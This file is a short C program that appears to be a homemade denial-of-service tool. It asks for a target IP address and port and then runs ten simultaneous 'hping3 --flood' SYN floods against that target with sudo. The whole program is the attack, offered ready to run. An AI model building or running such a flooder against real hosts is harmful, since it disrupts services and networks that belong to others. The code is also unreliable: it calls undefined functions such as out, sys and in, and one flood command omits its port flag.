#include <stdio.h>
#include <stdlib.h>

int main() {
	out("[+] trigering sudo . . .\n");
	sys("sudo -v");

	char ip[100];
	char port[100];

	out("[+] remember if you do ctrl+c and the TCP traffic doesent stop run the dos_s programm\n");

	out("Chose IP to DoS: ");
	in("%99s", ip);
	out("\n");
	out("Chose port for that IP: ");
	in("%99s", port);

	out("[+] preparing the DoS . . .\n");
	char command[2300];
	string(command, sizeof(command), "sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s & sudo hping3 --flood -S -p %s %s", port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip);
	
	out("[+] preparation done starting attack . . .\n");
	sys(command);
	sys("sudo pkill -9 hping3");

	return 0;
}
